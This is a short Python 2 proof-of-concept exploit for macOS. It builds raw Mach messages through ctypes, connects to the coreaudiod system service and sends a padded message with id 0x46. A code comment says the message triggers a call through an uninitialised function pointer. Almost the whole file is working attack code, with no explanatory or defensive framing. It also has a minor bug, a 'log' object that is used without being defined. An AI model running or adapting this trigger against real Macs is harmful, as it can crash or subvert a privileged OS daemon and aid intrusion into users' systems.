#! /usr/bin/python
import ctypes
import ctypes.util
import os
import subprocess
import struct
import sys
#
# Required native libraries
#
libpath = ctypes.util.find_library('CoreServices')
cs = None
try:
    cs = ctypes.cdll.LoadLibrary(libpath)
except:
    log.error('Failed to load CoreServices')
#
# MACH Ports
#
MACH_PORT_NULL = 0
#
# MACH Message options
#
MACH_SEND_MSG = 0x00000001
MACH_RCV_MSG = 0x00000002
MACH_RCV_LARGE = 0x00000004
MACH_MSG_TIMEOUT_NONE = 0
#
# MACH Message Header
#
MACH_MSGH_BITS_ZERO = 0x00000000
MACH_MSGH_BITS_REMOTE_MASK = 0x000000ff
MACH_MSGH_BITS_LOCAL_MASK = 0x0000ff00
MACH_MSGH_BITS_COMPLEX = 0x80000000
MACH_MSGH_BITS_USER = 0x8000ffff
MACH_MSGH_BITS_CIRCULAR = 0x40000000
MACH_MSGH_BITS_USED = 0xc000ffff
MACH_MSGH_BITS_PORTS_MASK = (MACH_MSGH_BITS_REMOTE_MASK | MACH_MSGH_BITS_LOCAL_MASK)
def MACH_MSGH_BITS(remote, local):
    return (remote) | (local << 8)
def MACH_MSGH_BITS_REMOTE(bits):
    return ((bits) & MACH_MSGH_BITS_REMOTE_MASK)
    
def MACH_MSGH_BITS_LOCAL(bits):
    return ((bits) & MACH_MSGH_BITS_LOCAL_MASK) >> 8
def MACH_MSGH_BITS_PORTS(bits):
    return ((bits) & MACH_MSGH_BITS_PORTS_MASK)
def MACH_MSGH_BITS_OTHER(bits):
    return ((bits) & ~MACH_MSGH_BITS_PORTS_MASK)
    
class mach_msg_header_t(ctypes.Structure):
    """Mach message header type"""
    _fields_ = [("msgh_bits", ctypes.c_uint),
                ("msgh_size", ctypes.c_uint),
                ("msgh_remote_port", ctypes.c_void_p),
                ("msgh_local_port", ctypes.c_void_p),
                ("msgh_reserved", ctypes.c_uint),
                ("msgh_id", ctypes.c_int)]
    
#
# MACH Message Body
#
    
class mach_msg_body_t(ctypes.Structure):
    """Mach message body type"""
    _fields_ = [("msgh_descriptor_count", ctypes.c_uint)]
#
# MACH Message
#
class mach_msg_base_t(ctypes.Structure):
    """Mach message type"""
    _fields_ = [("header", mach_msg_header_t),
                ("body", mach_msg_body_t)]
    
#
# MACH Error messages
#

#
# MACH Functions
#
def get_bootstrap():
    bootstrap_port = ctypes.c_uint32()
    cs.task_get_special_port(cs.mach_task_self(), 4, ctypes.byref(bootstrap_port))
    return bootstrap_port
def global_services():
    """List global registered services. TODO: without launchctl..."""
    servicelist = []
    for entry in subprocess.check_output(['launchctl', 'bslist', '1']).split('\n'):
        servicelist.append(entry[3:])
    return servicelist
def connect(bootstrap_port, service):
    """Connect to the named global service."""
    service_port = ctypes.c_uint32()
    if 0 == cs.bootstrap_look_up(bootstrap_port,
                         service,
                         ctypes.byref(service_port)):
        return service_port
    return None
def send(port, message, size):
    """Send the given message to the given port."""
    if 0 != cs.mach_msg(
                message,
                MACH_SEND_MSG,
                size,
                0,
                MACH_PORT_NULL,
                MACH_MSG_TIMEOUT_NONE,
                MACH_PORT_NULL,
                ):
        print 'OMFG send failed'

MACH_MSG_TYPE_MOVE_RECEIVE = 16  
MACH_MSG_TYPE_MOVE_SEND = 17
MACH_MSG_TYPE_MOVE_SEND_ONCE = 18
MACH_MSG_TYPE_COPY_SEND = 19
MACH_MSG_TYPE_MAKE_SEND = 20
MACH_MSG_TYPE_MAKE_SEND_ONCE = 21
MACH_MSG_TYPE_COPY_RECEIVE = 22
MACH_MSG_PHYSICAL_COPY = 0
MACH_MSG_VIRTUAL_COPY = 1
MACH_MSG_ALLOCATE = 2
MACH_MSG_OVERWRITE = 3

def send_buffer(port, buffer, id):
    message = ''
    message += struct.pack('I', MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND | MACH_MSG_VIRTUAL_COPY, 0))
    message += struct.pack('I', len(buffer) + 40)
    message += struct.pack('I', port.value)
    message += struct.pack('I', MACH_PORT_NULL)
    message += struct.pack('I', 0)
    message += struct.pack('I', id)
    message += buffer
    
    send(port, message, len(message))

if __name__ == "__main__":
    bootstrap_port = get_bootstrap()
    print bootstrap_port
    
    service = 'com.apple.audio.coreaudiod'
    print('Connecting to ' + service)
    service_port = connect(bootstrap_port, service)
    if service_port:
        print('Connected on port ' + str(service_port))
        # send msgh_id = 0x46 to coreaudiod to trigger the call of uninitialzed function pointer:
        send_buffer(service_port, '#' * 1024, 70) 
